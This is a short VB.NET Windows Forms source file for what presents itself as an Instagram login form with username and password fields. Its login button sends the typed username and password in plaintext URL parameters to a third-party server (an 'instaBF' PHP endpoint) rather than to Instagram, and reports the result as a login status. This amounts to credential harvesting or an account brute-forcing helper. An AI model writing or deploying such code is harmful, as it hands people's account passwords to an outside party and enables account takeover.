Imports System.Net
Imports System.IO

Public Class Form1

    Private Sub TextBox1_Click(sender As Object, e As EventArgs) Handles TextBox1.Click
        If TextBox1.Text = "username" Then
            TextBox1.ForeColor = Color.Black
            TextBox1.Text = ""
        End If
    End Sub
    Private Sub TextBox2_Click(sender As Object, e As EventArgs) Handles TextBox2.Click
        If TextBox2.Text = "password" Then
            TextBox2.ForeColor = Color.Black
            TextBox2.Text = ""
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If HGet("http://www.insta-qtr.com/instaBF/instagram.php?users=" & TextBox1.Text & "&passs=" & TextBox2.Text).Contains("successful") Then
            Label1.Text = "login status: Logged In"
        Else
            Label1.Text = "login status: Failed To Login"
        End If
    End Sub
    Public Function HGet(URL As String) As String
        Dim Request As HttpWebRequest = CType(WebRequest.Create(URL), HttpWebRequest)
        Request.Method = "GET"
        Request.KeepAlive = True
        Request.CookieContainer = New CookieContainer
        Request.Proxy = Nothing
        Dim Op As String
        Try
            Dim Res As HttpWebResponse = CType(Request.GetResponse(), HttpWebResponse)
            Dim StreRed As StreamReader = New StreamReader(Res.GetResponseStream())
            Op = StreRed.ReadToEnd()
        Catch ex As WebException
            Dim StreRed2 As StreamReader = New StreamReader(ex.Response.GetResponseStream())
            Op = StreRed2.ReadToEnd()
        End Try
        Return Op
    End Function
End Class
